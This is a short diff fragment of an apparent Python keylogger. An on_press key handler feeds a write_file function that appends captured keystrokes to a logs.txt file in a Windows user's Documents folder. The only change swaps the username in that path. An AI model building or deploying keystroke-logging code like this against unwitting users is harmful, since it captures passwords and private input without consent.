@@ -12,7 +12,7 @@ def on_press(key):
     write_file(keys)
     
 def write_file(keys):
-    with open("C:/Users/azureuser/Documents/logs.txt", "a") as f:
+    with open("C:/Users/whizhack/Documents/logs.txt", "a") as f:
         for key in keys:
             k = str(key).replace("'","")
             if k.find("space") > 0:
